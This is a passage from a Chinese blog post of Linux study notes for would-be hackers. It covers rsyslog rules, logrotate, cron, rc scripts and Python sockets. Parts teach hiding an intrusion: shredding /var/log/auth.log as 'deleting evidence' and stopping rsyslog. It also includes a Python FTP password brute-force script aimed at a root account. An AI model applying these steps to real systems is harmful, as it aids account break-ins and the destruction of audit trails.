found.</span><br></pre></td></tr></table></figure>



<h2 id="日志系统"><a href="#日志系统" class="headerlink" title="日志系统"></a>日志系统</h2><p>Linux 使用一个名为 syslogd 的守护进程来自动记录计算机上的事件。syslog 的几个变体，包括 rsyslog 和 syslog-ng</p>
<h3 id="rsyslog日志记录规则"><a href="#rsyslog日志记录规则" class="headerlink" title="rsyslog日志记录规则"></a>rsyslog日志记录规则</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">###############  </span><br><span class="line">#### RULES ####  </span><br><span class="line">###############  </span><br><span class="line"># </span><br><span class="line"><span class="number">117</span> </span><br><span class="line"># First some standard log files. Log by facility.  </span><br><span class="line"># </span><br><span class="line">auth,authpriv.* /var/log/auth.log </span><br><span class="line">*.*;auth,authpriv.none -/var/log/syslog  </span><br><span class="line">#cron.* /var/log/cron.log </span><br><span class="line">daemon.*  -/var/log/daemon.log  </span><br><span class="line">kern.* -/var/log/kern.log </span><br><span class="line"><span class="number">1</span>pr.* -/var/log/lpr.log </span><br><span class="line">mail.* -/var/log/mail.log </span><br><span class="line">user.* -/var/log/user.log </span><br><span class="line"> </span><br><span class="line"># </span><br><span class="line"># Logging for the mail <span class="keyword">system</span>. Split it up so that  </span><br><span class="line"># it is easy to write scripts to parse these files. </span><br><span class="line"># </span><br><span class="line">mail.info -/var/log/mail.info </span><br><span class="line">mail.warn -/var/log/mail.warn </span><br><span class="line">mail.err /var/log/mail.err</span><br></pre></td></tr></table></figure>

<p>每一行都是一个单独的日志记录规则，说明记录了哪些消息以及记录到哪里。这些规则的基本格式如<br>下: </p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">facility.<span class="built_in">priority</span> <span class="built_in">action</span></span><br></pre></td></tr></table></figure>

<p> facility 关键字引用正在记录其消息的程序，例如邮件、内核或打印系统。priority 关键字决定为该程序 记录哪种类型的消息。在最右边的 action 关键字引用将发送日志的位置。让我们更仔细地看一下每个部分， 首先是 facility 关键字，它指的是生成日志的任何软件，无论是内核、邮件系统还是用户。 </p>
<p>下面是一个有效的代码列表，可以用来代替我们的配置文件规则中的关键字 facility:<br>auth/authpriv 安全/授权消息<br>cron 时钟守护进程<br>daemon 其他守护进程<br>kern 内核消息<br>118<br>lpr 打印系统<br>mail 邮件系统<br>user 常规用户级别消息 </p>
<p>星号通配符（*）代替单词指的是所有信息。 您可以通过以逗号分隔的列表来选择多个。<br>优先级告诉系统要记录哪种消息。代码从最低优先级列出，从调试开始到最高优先级，以严重结束。 如果优先级为*，则记录所有优先级的消息。指定优先级时，将记录该优先级及更高优先级的消息。例如， 如果指定的优先级代码为告警 alert，系统将记录分类为告警和更高优先级的消息，但不会记录标记为 crit 的消息或低于警报的任何优先级。以下是有效优先级代码的完整列表： </p>
<p>• debug </p>
<p>• info </p>
<p>• notice</p>
<p>• warning </p>
<p>• warn </p>
<p>• error </p>
<p>• err </p>
<p>• crit </p>
<p>• alert </p>
<p>• emerg </p>
<p>• panic<br>warning、warn、error、err、emerg、panic，这些都已被弃用，不应该使用。 </p>
<p>操作通常是一个文件名和应该发送日志的位置。注意，通常，日志文件被发送到/var/log 目录，其文件 名描述为生成它们的工具，如 auth。这意味着，例如，由 auth 工具生成的日志将被发送到/var/log.auth.log。<br>让我们看一些日志规则的例子: </p>
<p>mail.* /var/log/mail<br>这个示例将所有(*)优先级的邮件事件记录到/var/log/mail 文件中。 </p>
<p>kern.crit /var/log/kernel<br>这个例子将把危险(crit)优先级或更高的内核事件记录到/var/log/kernel 中。 </p>
<p>*.emerg *<br>最后一个示例将记录所有登录用户的紧急事件(emerg)优先级的所有事件。</p>
<p>通过这些规则，黑客可以确 定日志文件的位置、更改优先级，甚至禁用特定的日志规则。 </p>
<h3 id="使用-LOGROTATE-自动清理日志"><a href="#使用-LOGROTATE-自动清理日志" class="headerlink" title="使用 LOGROTATE 自动清理日志"></a>使用 LOGROTATE 自动清理日志</h3><p>/etc/logrotate.conf </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># see <span class="string">"man logrotate"</span> <span class="keyword">for</span> details  </span><br><span class="line"># <span class="keyword">rotate</span> <span class="keyword">log</span> files weekly </span><br><span class="line">➊ weekly </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">keep</span> 4 weeks worth of backlogs </span><br><span class="line">➋ <span class="keyword">rotate</span> 4 </span><br><span class="line"> </span><br><span class="line">➌ # create new (empty) <span class="keyword">log</span> files after rotating old ones  </span><br><span class="line">create </span><br><span class="line"> </span><br><span class="line">➍ # uncomment this <span class="keyword">if</span> you want your <span class="keyword">log</span> files compressed  </span><br><span class="line">#<span class="keyword">compress</span> </span><br><span class="line"> </span><br><span class="line"># packages <span class="keyword">drop</span> <span class="keyword">log</span> rotation information into this directory  </span><br><span class="line"><span class="keyword">include</span> /etc/logrotate.<span class="keyword">d</span> </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">no</span> packages own wtmp, or btmp -- we'll <span class="keyword">rotate</span> them here </span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp  </span><br><span class="line"> &#123;   missingok  </span><br><span class="line"> monthly </span><br><span class="line"> create 0664 root utmp  </span><br><span class="line">120 </span><br><span class="line"> <span class="keyword">rotate</span> 1 </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>第一，你可以设置的时间单位数字参考➊。这里的默认值是 weekly，这意味着 rotate 关键字之后的任 何数字总是指 weeks（周） 。<br>进一步往下看，你可以看到设置切割转储日志默认设置的频率是每四个星期转储日志➋。这个默认配 置对大多数人都适用，但是如果您想让您的日志更长一些，以便进行调查，或者更短一些，以便更快地清 除它们，那么您应该更改这个设置。例如，如果您每周检查日志文件并希望节省存储空间，可以将此设置 更改为 rotate 1。如果您的日志有足够的存储空间，并且希望保留半永久记录以便以后进行取证分析，那么 您可以将此设置更改为 rotate 26 以保存六个月的日志，或者将 rotate 52 更改为保存一年的日志。<br>默认情况下，创建一个新的空日志文件当做旧日志的切割备份➌。在配置文件中建议，你也可以选择 压缩转储的日志文件➍。 </p>
<p>在每个转储周期结束时，将重命名日志文件，并在创建新日志文件时将其推到日志链的末尾，以替换 当前日志文件。例如，/var/log.auth 将变成/var/log.auth.1，那么/var/log.auth.2，以此类推。如果您每四周 轮换一次日志，并保留四组备份，那么您将得到/var/log.auth.4，但是没有/var/log.auth.5。意思是旧的 /var/log.auth.4 将被删除，而不是被推到/var/log/auth.5</p>
<h3 id="删除证据"><a href="#删除证据" class="headerlink" title="删除证据"></a>删除证据</h3><p>shred 将删除文件并多次覆盖它——默认情况下，shred 将覆盖 4 次。通常，文件被 覆盖的次数越多，恢复起来就越困难，但是请记住，每次覆盖都需要时间，因此对于非常大的文件，碎片 化可能会很耗时。 </p>
<p>要包括两个有用的选项，一个是-f 选项，它更改文件的权限，以便在需要更改权限时允许覆盖；另一 个是-n 选项，它允许您选择覆盖文件的次数。</p>
<p>例如，我们将使用以下命令将/var/log/auth.log 中的日志文件 分解覆盖 10 次: </p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;shred  -f  -<span class="built_in">n</span>  <span class="number">10</span>  /<span class="built_in">var</span>/<span class="built_in">log</span>/auth.log.*</span><br></pre></td></tr></table></figure>

<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><p>需要root权限</p>
<p>service  rsyslog  stop </p>
<h2 id="熟练使用服务"><a href="#熟练使用服务" class="headerlink" title="熟练使用服务"></a>熟练使用服务</h2><p>启动、停止和重新启动服务 </p>
<p>service servicename start|stop|restart </p>
<p>对黑客特别重要的四个：</p>
<p><strong>Apache Web Server，</strong></p>
<p><strong>OpenSSH，</strong></p>
<p><strong>MySQL ，</strong></p>
<p><strong>PostgreSQL 结合 Metasploit  。</strong> </p>
<h2 id="使用作业调度自动化任务"><a href="#使用作业调度自动化任务" class="headerlink" title="使用作业调度自动化任务"></a>使用作业调度自动化任务</h2><p>需要遵循的格式，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M   H  DOM  MON  DOW <span class="built_in"> USER </span> COMMAND </span><br><span class="line">30  2  * *   1-5  root  /root/myscanningscript</span><br></pre></td></tr></table></figure>

<p>leafpad  /etc/crontab </p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab </span></span><br><span class="line"><span class="comment"># Unlike any other crontab, you don't have to run the 'crontab'  </span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file </span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,  </span></span><br><span class="line"><span class="comment"># which no other crontabs do. </span></span><br><span class="line"> </span><br><span class="line">SHELL=<span class="regexp">/bin/sh</span> PATH=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># m h dom mon dow user command </span></span><br><span class="line"><span class="number">17</span> * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line"><span class="number">25</span> <span class="number">6</span> * * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">47</span> <span class="number">6</span> * * <span class="number">7</span> root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">52</span> <span class="number">6</span> <span class="number">1</span> * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="设置一个备份计划任务"><a href="#设置一个备份计划任务" class="headerlink" title="设置一个备份计划任务"></a>设置一个备份计划任务</h3><p>在 crontab 中添加下行： </p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">2</span> * * <span class="number">0</span> backup /bin/systembackup.sh</span><br></pre></td></tr></table></figure>

<p>cron 守护进程将在每月周日早上 2 点执行那个脚本。  </p>
<h3 id="crontab快捷方式"><a href="#crontab快捷方式" class="headerlink" title="crontab快捷方式"></a>crontab快捷方式</h3><p>crontab 文件有些内置的快捷方式，用来代替具体的时间，日期，月份。它包含这些：<br>179<br>• @yearly </p>
<p>• @annually </p>
<p>• @monthly </p>
<p>• @weekly </p>
<p>• @daily </p>
<p>• @midnight </p>
<p>• @noon </p>
<p>• @reboot<br>所以，如果你希望 MySQL 扫描器每天午夜运行，你可以添加下行到 crontab 文件： </p>
<p>@midnight user /usr/share/MySQLsscanner.sh </p>
<h3 id="使用-RC-脚本开机运行任务"><a href="#使用-RC-脚本开机运行任务" class="headerlink" title="使用 RC 脚本开机运行任务"></a>使用 RC 脚本开机运行任务</h3><p>Linux运行级别</p>
<p>Linux 有多个运行级别，用于指示启动时需要启动哪些服务。例如，运行级别 1 是单用户工作状态， rc 脚本会根据运行级别运行。 </p>
<p>0 系统停机状态<br>1 单用户工作状态<br>2 – 5 多用户状态<br>6 重启 </p>
<p>你以使用 update-rc.d 命令为 rc.d 脚本添加启动时要运行的服务。此命令允许你从 rc.d 脚本中添加或删 除服务。update-rc.d 的语法很简单，输入命令，后面输入脚本的名字然后输入动作</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;update-rc.d  &lt;name  of  the <span class="built_in"> script </span> <span class="keyword">or</span>  service&gt;  &lt;remove|defaults|disable|enable&gt;</span><br></pre></td></tr></table></figure>

<p>举个update-rc.d的例子，假设你总是希望PostgreSQL 数据库在系统启动时运行，这样你的Metasploit 框 架可以使用它储存黑客攻击和渗透测试的结果。你需要使用 update-rc.d 添一行到你的 rc.d 脚本来让它每次 系统启动时运行。 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span>-rc.d  postgresql  <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure>

<h2 id="PYTHON-网络通信"><a href="#PYTHON-网络通信" class="headerlink" title="PYTHON 网络通信"></a>PYTHON 网络通信</h2><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/python3 </span></span><br><span class="line">➊ <span class="keyword">import</span> socket </span><br><span class="line">➋ s = socket.socket() </span><br><span class="line">➌ s.connect((<span class="string">"192.168.1.101"</span>, <span class="number">22</span>)) </span><br><span class="line">➍ answer = s.recv(<span class="number">1024</span>) </span><br><span class="line">➎ print(answer)</span><br></pre></td></tr></table></figure>

<p>首先，我们导入 socket 模块➊，以便使用它的功能和工具。这里，我们将使用 socket 模块中的网络工 具来为我们处理通过网络连接的接口。Socket 为两个计算机节点提供了相互通信的方式。通常一个节点是服 务端一个是客户端。<br>然后我们创建了一个新的变量 s ，然后将它和 socket 模块中的 socket 类关联➋。这样，每当我们想使 用 socket 类时，就不必引用完整的 socket.socket（）语法，只需使用 s 变量名即可。<br>然后，我们使用 socket 模块➌中的 connect（）方法来建立到特定 IP 和端口的网络连接。记住，方法是 可用于特定对象的函数，语法为 object.method（例如 socket.connect）。这里，我连接到 IP 地址 192.168.1.101， 它是我网络上一台电脑的 IP 地址，22 端口是默认的 ssh 端口。您可以在 Linux 或 Kali 的另一个实例上对此 进行测试。大多数 22 端口是默认打开。<br>一旦你建立了联系，就可以做很多事情。这里我们使用接收方法 recv 来接收来自 socket 的 1024 bytes 数据 ➍ 并且将他们储存到一个叫 answer 的变量里；这 1024 bytes 包含了 banner 信息。然后，我们用 print （）函数将该变量的内容打印到屏幕上，以查看通过该 socket 传递的数据，从而允许我们监视它！在最后 一行，我们关闭连接。 </p>
<h3 id="创建-TCP-监听器"><a href="#创建-TCP-监听器" class="headerlink" title="创建 TCP 监听器"></a>创建 TCP 监听器</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/<span class="keyword">bin/python3 </span><span class="meta">import</span> socket </span><br><span class="line">➊ TCP_IP = <span class="string">"192.168.181.190"</span> TCP_PORT = <span class="number">6996</span> </span><br><span class="line"><span class="keyword">BUFFER_SIZE </span>= <span class="number">100</span> </span><br><span class="line"> </span><br><span class="line">➋ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">➌ s.<span class="keyword">bind((TCP_IP, </span>TCP_PORT)) </span><br><span class="line">➍ s.listen (<span class="number">1</span>) </span><br><span class="line"> </span><br><span class="line">➎ conn,<span class="keyword">addr </span>= s.accept() </span><br><span class="line"> print (<span class="string">'Connection address: '</span>, <span class="keyword">addr </span>)  </span><br><span class="line"> <span class="meta">while</span> <span class="number">1</span>: </span><br><span class="line">		<span class="meta">data</span><span class="symbol">=conn</span>.recv(<span class="keyword">BUFFER_SIZE) </span></span><br><span class="line">		<span class="meta">if</span> not <span class="meta">data</span>:</span><br><span class="line">			<span class="keyword">break </span></span><br><span class="line">		print (<span class="string">"Received data: "</span>, <span class="meta">data</span>)  </span><br><span class="line"> 	 	conn.send(<span class="meta">data</span>) <span class="symbol">#echo</span> </span><br><span class="line"> </span><br><span class="line"><span class="symbol">conn.close</span></span><br></pre></td></tr></table></figure>

<p>我们声明希望脚本使用 Python 解释器运行，然后像以前一样导入套接字模块，这样我们就可以使用它 的功能。然后，我们定义变量来保存 TCP/IP 地址、要监听的端口以及要从连接系统捕获的数据的缓冲区大 小的信息➊。<br>我们定义了 socket ➋，并使用刚才创建的变量将 socket 绑定到 IP 地址和端口➌。我们告诉 socket 使用 socket 库➍中的 listen()方法进行侦听。<br>然后，我们使用 socket 库的 accept 方法捕获连接系统的 IP 地址和端口，并将这些信息打印到屏幕上，<br>以便用户可以看到它➎。</p>
<p>现在，转到网络上的另一台计算机，使用浏览器连接到脚本中指定的 6996 端口。运行 tcp_server.py 脚 本，你应该能够连接和收集有关那个系统的关键信息，包括连接系统的 IP 地址和端口，如下所示： </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;./tcp_server.py </span><br><span class="line">Connection <span class="string">Address:</span> (<span class="string">'192.168.181.190'</span>, <span class="number">45368</span>) Received <span class="string">data:</span> Get <span class="regexp">/HTTP/</span><span class="number">1.1</span> </span><br><span class="line"><span class="string">Host:</span><span class="number">192.168</span><span class="number">.181</span><span class="number">.190</span>:<span class="number">6996</span> </span><br><span class="line">User ­<span class="string">Agent:</span>Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; <span class="string">rv:</span><span class="number">45.0</span>) Gec </span><br><span class="line"></span><br><span class="line">­­snip---</span><br></pre></td></tr></table></figure>

<p>这是黑客在决定攻击前收集的关键信息。漏洞攻击（或黑客攻击）是针对特定的操作系统、应用程序， 甚至是正在使用的语言，因此黑客需要在继续操作之前尽可能了解有关目标的信息。在黑客攻击之前收集信息的行为通常被称为侦察。</p>
<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>这个脚本要求用户输入 ftp 服务器 号和要破解的 ftp 帐户的用户名。然后它读取一个包含可能密码列表的外部文本文件，并尝试每个密码来破 解 ftp 帐户。脚本执行此操作直到成功或密码用完。 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3 </span></span><br><span class="line">import ftplib </span><br><span class="line">➊<span class="built_in"> server </span>= input(FTP Server: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➋ user = input("</span>username: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➌ Passwordlist = input ("</span>Path <span class="keyword">to</span> Password List &gt; <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➍ try: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">	with open(Passwordlist, 'r') as pw:  </span></span><br><span class="line"><span class="string">	for word in pw: </span></span><br><span class="line"><span class="string">➎ 		word = word.strip ('\r').strip('\n') </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➏ 		try: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">			ftp = ftplib.FTP(server)  </span></span><br><span class="line"><span class="string">			ftp.login(user, word) </span></span><br><span class="line"><span class="string">➐			print (Success! The password is ' + word) </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➑ 		except: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">			print('still trying...') </span></span><br><span class="line"><span class="string">	except: </span></span><br><span class="line"><span class="string">		print ('Wordlist error')</span></span><br></pre></td></tr></table></figure>

<p>我们将使用 ftplib 模块中的工具来实现 FTP 协议，所以首先我们导入它。然后，我们创建一个名为 server 的变量和另一个名为 user 的变量，它将存储一些用户输入的命令。你的脚本将提示用户输入 FTP 服务器的 IP 地址➊和用户尝试进入的帐户的用户名➋。<br>然后我们询问用户密码列表➌的路径。通过在终端中输入 locate wordlist，您可以在 kali linux 中找到许 多密码列表。<br>然后，我们开始 try 代码块，该代码将使用用户提供的密码列表来尝试破解用户提供的用户名的密码。</p>
<p>注意，我们使用了一个新的名为 strip()➎的 python 函数。此函数删除字符串的第一个和最后一个字符 （在这里是密码列表）。如果此列表中的密码前面有空格或逗号，则需要执行此操作。strip()函数的作用是： 删除这些字符，只留下潜在密码的字符串。如果我们不去除空白，我们可能会得到一个假阴性。<br>然后，我们使用第二个 try➏代码块。这里，我们首先使用 ftplib 模块连接到用户提供的 IP 地址的服务 器，然后从该帐户的密码列表中尝试下一个密码。<br>如果用户名和密码的组合导致错误，则代码块退出并转到 except 子句➑，在该子句中打印 still trying， 然后返回到 for 子句的顶部并从密码列表中获取下一个密码以尝试。<br>如果组合成功，成功的密码将会被打印到屏幕上➐。最后一行记录任何其他可能导致错误的情况。例 如，如果用户输入程序无法处理的内容，例如单词表的路径错误或缺少单词表。<br>现在，让我们对 192.168.1.101 的 FTP 服务运行这个脚本，看看是否可以破解 root 用户的密码。我使用 的是我工作目录中名为 bigpasswordlist.txt 的密码列表。如果密码列表不在你的工作目录中，您可能需要提 供到所使用密码列表的完整路径（例如，/usr/share/bigpasswordlist.txt）。 </p>
<p>如果想要学习更多 Python 知识，强烈推荐由 Al Sweigart 编写的 No Starch Press 出版社 的优秀书籍《Automate the Boring Stuff with Python (2015)》。 </p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可联系QQ 643713081，也可以邮件至 643713081@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">赏</a>
</p>


<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>Linux 基础</p>
    <p><span class="copy-title">文章字数:</span><span class="post-count">11.6k</span></p>
    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
    <p><span class="copy-title">发布时间:</span>2019-09-12, 00:17:00</p>
    <p><span class="copy-title">最后更新:</span>2020-05-24, 18:37:18</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/12/Linux 基础/" title="Linux 基础">http://jayxv.github.io/2019/09/12/Linux 基础/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2020 Van1sh</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['@Van1sh','@FzWjScJ','#Write Up','#docker','#Sage','#CTF','#Basic','#ECC','#Paillier','#Crypto','#TLS 1.2','#Web','#Files','#Serialization','#Lattice','#Dsa','#LCG','#Rc4','#SM4','#Knapsack','#Rsa','#DES','#差分密码分析','#RSA','#continued_fraction','#RE','#paper','#small private exponent','#SQL','#python','#操作模式','#number theory','#Abstract algebra','#SPN','#线性密码分析','#ETH','#Shadowsocks','#XSS','#Nmap','#Coppersmith’s Method','#Linux','#book',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
